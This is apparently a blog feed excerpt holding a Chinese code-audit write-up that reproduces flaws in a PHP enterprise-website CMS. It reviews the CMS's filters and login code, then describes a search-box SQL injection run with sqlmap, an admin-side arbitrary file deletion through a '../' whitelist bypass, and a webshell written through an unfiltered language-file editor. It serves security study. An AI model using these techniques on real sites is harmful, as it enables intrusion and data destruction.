&lt;p&gt;参考资料：&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;环境准备：&lt;/p&gt;
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="SQL注入" scheme="https://hack-for.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>新秀企业网站系统代码审计学习(复现)</title>
    <link href="https://hack-for.fun/844d1b07.html"/>
    <id>https://hack-for.fun/844d1b07.html</id>
    <published>2020-09-12T01:19:38.000Z</published>
    <updated>2020-09-12T10:49:37.659Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>参考资料：</p><p><a href="https://v0w.top/2020/08/26/CodeAudit-php/">代码审计常见的三种方法（PHP篇）</a></p><p><a href="https://www.sqlsec.com/2020/01/sinsiu.html#toc-heading-1">PHP代码审计初次尝试之新秀企业网站系统</a></p><p>审计思路通过脑图大概总结如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912095326.png" alt="image-20200912095322738"></p><h1 id="了解系统"><a href="#了解系统" class="headerlink" title="了解系统"></a>了解系统</h1><p><strong>CMS名称</strong>：新秀企业网站系统PHP版</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183413.png" alt="image-20200912095625466"></p><p>看着界面就知道是用于企业打广告(x)和发布信息，招聘等功能的系统。且存在前台用户登录和后台管理系统。存在搜索功能。</p><h1 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h1><h2 id="IP登录限制-猜测伪造IP注入"><a href="#IP登录限制-猜测伪造IP注入" class="headerlink" title="IP登录限制 - 猜测伪造IP注入"></a>IP登录限制 - 猜测伪造IP注入</h2><p>限制了前台、后台的登录次数限制、注册限制、可能会影响到后面SQL注入漏洞的测试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183349.png" alt="image-20200912100248513"></p><p>可能出现的漏洞：<strong>伪造IP进行注入攻击</strong></p><p>数据库监控，在注册的地方看看<code>ip</code> 是否被带入了数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184550.png" alt="image-20200912102325325"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from php_shisiusafe where saf_ip &#x3D; &#39;127.0.0.1&#39;  and saf_action &#x3D; &#39;register&#39;</span><br></pre></td></tr></table></figure><p>全局定位到获取用户iP的代码部分：</p><p>phpstorm 搜索 获取IP，即可。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取客户端IP</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>) &amp;&amp; strcasecmp(getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>),<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="string">&#x27;unknown&#x27;</span>))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip)))</span><br><span class="line">&#123;</span><br><span class="line">$ip = <span class="string">&#x27;0.0.0.0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，当ip 除去<code>.</code>  后，如果不是纯数字，那么就设置为 0.0.0.0 。因此通过伪造IP进行注入是行不通了。</p><h2 id="XSS-过滤"><a href="#XSS-过滤" class="headerlink" title="XSS 过滤"></a>XSS 过滤</h2><p>前台存在留言功能。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184533.png" alt="image-20200912103732317"></p><p>提交后，我们登录后台管理员进行查看留言内容。 发现并没有执行js代码。</p><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;message&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$mes_email = post(<span class="string">&#x27;email&#x27;</span>);</span><br><span class="line">$mes_type = post(<span class="string">&#x27;type&#x27;</span>);</span><br><span class="line">$mes_title = post(<span class="string">&#x27;title&#x27;</span>);</span><br><span class="line">$mes_text = post(<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$mes_show = post(<span class="string">&#x27;show&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>($mes_email == <span class="string">&#x27;&#x27;</span> || $mes_type == <span class="string">&#x27;&#x27;</span> || $mes_title == <span class="string">&#x27;&#x27;</span> || $mes_text == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$mes_add_time = time();</span><br><span class="line"><span class="keyword">if</span>($mes_show != <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">$mes_show = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> message();</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_user_id&#x27;</span>,$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_type&#x27;</span>,$mes_type);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_email&#x27;</span>,$mes_email);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_title&#x27;</span>,$mes_title);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_text&#x27;</span>,$mes_text);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_add_time&#x27;</span>,$mes_add_time);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_show&#x27;</span>,$mes_show);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;mes_lang&#x27;</span>,S_LANG);</span><br><span class="line">$obj-&gt;add();</span><br><span class="line"><span class="keyword">if</span>(intval(get_varia(<span class="string">&#x27;sentmail&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">$email_title = <span class="string">&#x27;您的网站有了新的留言&#x27;</span>;</span><br><span class="line">$email_text = <span class="string">&quot;[$mes_type] $mes_title &lt;br /&gt; $mes_text&quot;</span>;</span><br><span class="line">call_send_email($email_title,$email_text,$global[<span class="string">&#x27;user_id&#x27;</span>],$mes_email);</span><br><span class="line">&#125;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_message&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;message&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的输入是被传入了<code>post</code> 函数进行执行，跟进该函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取post</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$val,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_POST[$val])?$_POST[$val]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过了<code>strict</code> 条件的过滤函数，找到这个的定义处。</p><p>include/function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//严格过滤字符串中的危险符号</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str);</span><br><span class="line">   &#125;</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;#60;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;#62;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;&amp;#63;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&amp;#37;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">39</span>),<span class="string">&#x27;&amp;#39;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">34</span>),<span class="string">&#x27;&amp;#34;&#x27;</span>,$str);</span><br><span class="line">   $str = str_replace(chr(<span class="number">13</span>).chr(<span class="number">10</span>),<span class="string">&#x27;&lt;br /&gt;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到html 的闭合标签被转义了，所以没法XSS</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_pwd</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">safe(<span class="string">&#x27;edit_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">$old_pwd = post(<span class="string">&#x27;old_pwd&#x27;</span>);</span><br><span class="line">$new_pwd = post(<span class="string">&#x27;new_pwd&#x27;</span>);</span><br><span class="line">$re_pwd = post(<span class="string">&#x27;re_pwd&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($old_pwd) &lt; <span class="number">6</span> || strlen($old_pwd) &gt; <span class="number">15</span> || strlen($new_pwd) &lt; <span class="number">6</span> || strlen($new_pwd) &gt; <span class="number">15</span> || $new_pwd != $re_pwd)</span><br><span class="line">&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;submit_error_info&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$use_password = md5($old_pwd);</span><br><span class="line">$obj = <span class="keyword">new</span> users();</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&quot;use_password = &#x27;$use_password&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($obj-&gt;get_count() &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$use_password = md5($new_pwd);</span><br><span class="line">$obj-&gt;set_value(<span class="string">&#x27;use_password&#x27;</span>,$use_password);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">$obj-&gt;set_where(<span class="string">&#x27;use_id = &#x27;</span>.$global[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$obj-&gt;edit();</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;over&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$info_text = $lang[<span class="string">&#x27;old_pwd_error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,$info_text);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,$lang[<span class="string">&#x27;go_back&#x27;</span>]);</span><br><span class="line">$smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;entrance&#x27;</span>=&gt;$global[<span class="string">&#x27;entrance&#x27;</span>],<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;profile&#x27;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CSRF 修改用户密码，需要旧密码，行不通。</p><h2 id="可控变量过滤"><a href="#可控变量过滤" class="headerlink" title="可控变量过滤"></a>可控变量过滤</h2><h3 id="session-过滤"><a href="#session-过滤" class="headerlink" title="session 过滤"></a>session 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取session</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_session</span>(<span class="params">$name,$filter = <span class="string">&#x27;strict&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_SESSION)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_SESSION[$name])?$_SESSION[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> $filter(<span class="keyword">isset</span>($_COOKIE[$name])?$_COOKIE[$name]:<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cookie-过滤"><a href="#cookie-过滤" class="headerlink" title="cookie 过滤"></a>cookie 过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span>(<span class="params">$name,$value,$filter = <span class="string">&#x27;strict&#x27;</span>,$expire = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($expire == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      setcookie($name,$filter($value));</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      setcookie($name,$filter($value),$expire);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="admin-登录"><a href="#admin-登录" class="headerlink" title="admin 登录"></a>admin 登录</h3><p>admin/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;admin_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $username = substr(post(<span class="string">&#x27;username&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   $password = substr(post(<span class="string">&#x27;password&#x27;</span>),<span class="number">0</span>,<span class="number">30</span>);</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> || $password == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_username&#x27;</span>);</span><br><span class="line">      unset_session(<span class="string">&#x27;admin_password&#x27;</span>);</span><br><span class="line">      $info_text = <span class="string">&#x27;对不起，用户名和密码不能为空&#x27;</span>;</span><br><span class="line">      $link_text = <span class="string">&#x27;返回重新登录&#x27;</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     ……</span><br></pre></td></tr></table></figure><h3 id="user-登录"><a href="#user-登录" class="headerlink" title="user 登录"></a>user 登录</h3><p>index/module/info_main.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   safe(<span class="string">&#x27;user_login&#x27;</span>);</span><br><span class="line">   <span class="keyword">global</span> $global,$smarty,$lang;</span><br><span class="line">   $info_text = post(<span class="string">&#x27;info_text&#x27;</span>);</span><br><span class="line">   $link_text = post(<span class="string">&#x27;link_text&#x27;</span>);</span><br><span class="line">   $link_href = post(<span class="string">&#x27;link_href&#x27;</span>);</span><br><span class="line">   $username = post(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">   $password = post(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(strlen($username) &gt; <span class="number">30</span>)&#123;$username = substr($username,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>(strlen($password) &gt; <span class="number">30</span>)&#123;$password = substr($password,<span class="number">30</span>);&#125;</span><br><span class="line">   <span class="keyword">if</span>($username == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> $password == <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以看到，基本都经过了带有过滤的函数处理。所以像，SQL注入和XSS 这种需要构造特殊符号的漏洞几乎很难了</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>基于功能点去测，先高危后低危。后台一般防御较弱，从后台突破较容易。而后台存在的功能有：图片、文件、模板管理、删除、留言审核，等其他功能。</p><h2 id="前台搜索框SQL-注入"><a href="#前台搜索框SQL-注入" class="headerlink" title="前台搜索框SQL 注入"></a>前台搜索框SQL 注入</h2><p>开启MySQL 监控，然后再搜索框进行搜索。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184500.png" alt="image-20200912161945551"></p><p>如图，123，被带入SQL语句进行查询，单引号闭合。将关键字在整个文件夹中搜索：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184441.png" alt="image-20200912162117271"></p><p>这里先rawurldecode 解码，然后带入拼接进入查询。</p><p>然后下断点进行分析：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184427.png" alt="image-20200912165411168"></p><p>直接上sqlmap。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184409.png" alt="image-20200912155851842"></p><h2 id="后台任意文件删除漏洞"><a href="#后台任意文件删除漏洞" class="headerlink" title="后台任意文件删除漏洞"></a>后台任意文件删除漏洞</h2><p><strong>/admin/deal.php</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184208.png" alt="image-20200912144227587"></p><p>此处采用了白名单的形式，只能删除 指定的三个目录下的文件。但是忽略了可以用<code>../</code>来绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($path,<span class="number">0</span>,strlen($dir[$i])) == $dir[$i])</span><br><span class="line">&#123;</span><br><span class="line">   $flag = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>substr 从第<code>$path</code>的第一个字母开始往后判断，截取path前半部分长度和白名单是否相等，即是否是白名单里的那几个目录，是，然后<code>unlink</code>删除掉。</p><p>成功删除文件时，返回1。</p><p>这里我遇到了一个问题，就是这个域名是通过MAMP修改的本地HOSTS文件解析的，然后找到了一篇文章，<a href="https://www.jianshu.com/p/3018b2697bb0%EF%BC%8C%E7%AE%80%E5%8D%95%E8%AE%BE%E7%BD%AE%E4%B8%80%E4%B8%8B%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%E3%80%82">https://www.jianshu.com/p/3018b2697bb0，简单设置一下就可以了。</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184157.png" alt="image-20200912152353172"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184144.png" alt="image-20200912152108244"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184031.gif" alt="漏洞演示"></p><h2 id="后台编辑语言文件设置GetShell"><a href="#后台编辑语言文件设置GetShell" class="headerlink" title="后台编辑语言文件设置GetShell"></a>后台编辑语言文件设置GetShell</h2><p>成功编辑后，回显 编辑语言包成功。那么在整个文件中搜索即可定位到代码。<br>**/admin/module/file/deal.php**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_lang</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $smarty,$lang;</span><br><span class="line">   $path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">   $lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">   file_put_contents($path,$lang_text);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;info_text&#x27;</span>,<span class="string">&#x27;编辑语言包成功&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_text&#x27;</span>,<span class="string">&#x27;返回上一页&#x27;</span>);</span><br><span class="line">   $smarty-&gt;assign(<span class="string">&#x27;link_href&#x27;</span>,url(<span class="keyword">array</span>(<span class="string">&#x27;channel&#x27;</span>=&gt;<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;mod&#x27;</span>=&gt;<span class="string">&#x27;lang_edit&#x27;</span>,<span class="string">&#x27;path&#x27;</span>=&gt;rawurlencode($path))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该函数中，经过<code>post()</code> 函数过滤，但是对于<code>$lang_text</code> 的过滤规则是<code>no_filter</code> ，跟进查看一下该规则。</p><p>/include/function.php,104行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">   &#123;</span><br><span class="line">      $str = stripslashes($str); <span class="comment">// 删除反斜杠</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有过滤 <code>$lang_text</code> 就通过<code>file_put_contents</code> 写入文件，那么这里就可以写WebShell。</p><p>同样的，下断点来调试分析。</p><p>step into ，慢慢点，可以看到这里没有任何过滤，写入webshell</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912184010.png" alt="image-20200912173700069"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183848.png" alt="image-20200912173822681"></p><p><code>$path</code> 可控的，这里只需要把<code>$path</code> 改为一个<code>.php</code> 后缀的就可以GetShell 了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183833.png" alt="image-20200912174519203"></p><p><img 